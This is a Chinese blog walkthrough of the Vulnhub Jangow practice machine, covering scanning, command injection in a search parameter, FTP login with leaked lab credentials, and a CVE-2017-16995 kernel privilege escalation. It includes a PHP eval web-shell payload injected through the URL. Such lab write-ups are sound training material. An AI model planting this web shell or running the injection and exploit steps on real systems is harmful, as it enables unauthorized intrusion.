---
title: Vulnhub-Jangow  
date: 2024-06-10 
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/Jangow.html"
---

# JANGOW: 1.0.1

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401231626253.png" alt="image-20240122151541089" style="zoom:50%;" />

今天学习一下枚举靶场`jangow`，但是遇到了一些意外，刚打开的时候遇到一个（vmui）的报错:

> VMware Workstation 不可恢复错误：(vmui) 错误代码0xc0000094
>
> solution：将文件的兼容性更改为vmware station 16.x，点开文件，右键 > 管理 > 更改文件兼容性即可。

然后打开以后发生如下报错： 

![](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401231626254.png)

而且扫不出来：

```shell
┌──(root㉿kali)-[/home/kali]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:ef:8a:72, IPv4: 192.168.244.133
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.244.1   00:50:56:c0:00:08       (Unknown)
192.168.244.2   00:50:56:ff:22:db       (Unknown)
192.168.244.254 00:50:56:ee:9a:ca       (Unknown)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.847 seconds (138.60 hosts/sec). 3 responded
                                                                             
┌──(root㉿kali)-[/home/kali]
└─# sudo netdiscover -i eth1 -r 192.168.244.0/24
pcap_open_live(): eth1: No such device exists (No such device exists)
```

网络没配置成功，没道理的，这里我已经设置了NET模式了，查阅[相关资料](https://www.reddit.com/r/HowToHack/comments/11ydjdm/jangow_101_ctf_dont_show_any_open_port/)以后，我尝试更改成桥接模式：

![image-20240123100200722](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401231626255.png)

还是和之前一样的报错，注意到在打开过程中出现了一个报错：

![image-20240123100353721](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401231626256.png)

莫非。。。再次更改文件兼容性：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401231626257.png" alt="image-20240123100812320" style="zoom:50%;" />

失败，这个虚拟机的系统是由有密码的，先尝试找一下密码：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401231626259.png" alt="image-20240123101727865" style="zoom:33%;" />

然后进行恢复：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401231626260.png" alt="image-20240123101805785" style="zoom:50%;" />

而尝试密码并不能登录上去。。。没办法了，尝试使用virtual box进行使用。。。。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401231626261.png" alt="image-20240123102848343" style="zoom: 67%;" />

就很神奇，扫一下试试：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401231626262.png" alt="image-20240123103223711" style="zoom:50%;" />

可以访问到，使用`nmap`还有`Gobuster`进行扫描：

## Nmap扫描

```shell
sudo nmap -sS -sV -sC -Pn -p- -A 192.168.56.118 -oN jangow_scan.txt
# TCP扫描sS是SYN扫描，半连接扫描，nmap只发送SYN报文，通过服务器是否响应SYN+ACK来判断对应端口是否开放
# TCP扫描sT是全连接扫描会和服务器建立完整的三次握手，效率低
# -sV:探测开放的端口的系统/服务信息
# -sC:执行默认脚本扫描
# -Pn：跳过主机发现，视所有主机都在线
# -p:指定端口扫描范围
# -p-:用于指定扫描所有端口
# -A：使能系统探测、版本检测、脚本扫描、路由追踪
# -oN:输出到指定文件
```

实战发现扫描过慢，修改参数进行扫描，结果为：

```shell
┌──(kali㉿kali)-[~]
└─$ nmap 192.168.56.118
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-22 23:33 EST
Nmap scan report for 192.168.56.118
Host is up (0.0015s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE
21/tcp  open  ftp
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
Nmap done: 1 IP address (1 host up) scanned in 4.81 seconds
```

## Gobuster扫描

还可以使用`Gobuster`进行扫描：

```shell
gobuster dir -u https://192.168.56.118 -w /usr/share/wordlists/dirbuster directory-list-lowercase-2.3-medium.txt -x .js,.txt,.php,.sh
# -u选项指定目标 URL，-w指定与 Gobuster 结合使用的单词列表，-x允许您指定要搜索的文件类型。
```

结果为：

```shell
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.56.118 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .js,.txt,.php,.sh
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.118
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js,txt,php,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/site                 (Status: 301) [Size: 315] [--> http://192.168.56.118/site/]                                               
/.php                 (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
Progress: 1038215 / 1038220 (100.00%)
===============================================================
Finished
===============================================================
```

## 访问站点踩点

尝试访问站点：

![192.168.56.118_site_](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401231626263.png)

瞎点点看看，发现`buscar`可以点进去，且使用的是get参数，尝试进行传参：

![image-20240123122001968](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401231626264.png)

![image-20240123122144863](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401231626265.png)

![image-20240123122230030](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401231626266.png)

查看隐藏文件：

![image-20240123122343076](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401231626267.png)

发现了账号密码：`jangow01`和`abygurl69`.

## ftp登录

```shell
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.56.118
Connected to 192.168.56.118.
220 (vsFTPd 3.0.3)
Name (192.168.56.118:kali): jangow01
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||28341|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Oct 31  2021 html
226 Directory send OK.
ftp> cd /home
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||14452|)
150 Here comes the directory listing.
drwxr-xr-x    4 1000     1000         4096 Jun 10  2021 jangow01
226 Directory send OK.
ftp> cd jangow01
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||42477|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000           33 Jun 10  2021 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||5901|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |**********************************************************|    33       31.19 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (9.66 KiB/s)
ftp> quit
221 Goodbye.
┌──(kali㉿kali)-[~]
└─$ cat user.txt              
d41d8cd98f00b204e9800998ecf8427e
```

然后尝试登录靶机试试：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401231626268.png" alt="image-20240123131519187" style="zoom: 50%;" />

发现内核版本过低，查找相关漏洞：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401231626269.png" alt="image-20240123131851451" style="zoom:50%;" />

我改名为`cve-2017-16995.c`了！将文件进行ftp传过去：

```shell
┌──(root㉿kali)-[/home/kali/nmap/jangow]
└─# ftp 192.168.56.118
Connected to 192.168.56.118.
220 (vsFTPd 3.0.3)
Name (192.168.56.118:kali): jangow01
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put cve-2017-16995.c 
local: cve-2017-16995.c remote: cve-2017-16995.c
229 Entering Extended Passive Mode (|||39018|)
553 Could not create file.
ftp> ls
229 Entering Extended Passive Mode (|||7501|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Oct 31  2021 html
226 Directory send OK.
ftp> cd /home/jangow01
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||16802|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000           33 Jun 10  2021 user.txt
226 Directory send OK.
ftp> put cve-2017-16995.c 
local: cve-2017-16995.c remote: cve-2017-16995.c
229 Entering Extended Passive Mode (|||6339|)
150 Ok to send data.
100% |********************************| 13728       50.74 MiB/s    00:00 ETA
226 Transfer complete.
13728 bytes sent in 00:00 (3.13 MiB/s)
```

然后编译：

```shell
gcc cve-2017-16995.c -o cve-2017-16995
```

提升一下权限：

```shell
chmod +x ./cve-2017-16995
```

按理说接下来直接运行即可，但是这边的机器不知道咋回事，可能是按键映射有问题，搞不了，气死我了，传一个shell上去，利用菜刀进行控制吧。。。

尝试传入shell：

```shell
http://192.168.56.118/site/busque.php?buscar=echo '<?php @eval($_POST['hack']); ?>' >> hack.php
```

![image-20240123140306372](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401231626270.png)

![image-20240123140810914](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401231626271.png)

这是个十分愚蠢的错误，权限不足。。。。。（这里写的是 - 。。。。）

先进入前面一个目录，再使用tab补全出来，就会出现反斜杠了，然而我打开以后并不能进行执行：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401231626272.png" alt="image-20240123150803405" style="zoom:50%;" />

我真的无语了，查看别的师傅的wp，基本到这里就结束了，可能是我哪里操作有点问题，一直检测不出来，就蛮无语的。。。。（我是sb，这里减少权限了，我居然一直没看出来）

但是还是要做的，在本地编译好，放到蚁剑上上传一下试试：

![image-20240123152159711](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401231626273.png)

然后执行，失败。。。

经过我反复进行尝试最后发现，在`jangow01`操作时需要对`cve-2017-16995.c`进行更改权限才行。。。

```shell
chmod -x cve-2017-16995.c
gcc cve-2017-16995.c -o cve-2017-16995
./cve-2017-16995
```

（操作一直都是错的，居然可以得到flag..)

得到flag：

![aaa](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401231626274.png)

![image-20240123162426500](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401231626275.png)

真要命啊。。。但是总算功德圆满了。。。

（师傅们不要骂，这是打错了，sb了那一天。。这里所有的`chmod -x`都要换成`chmod +x`）
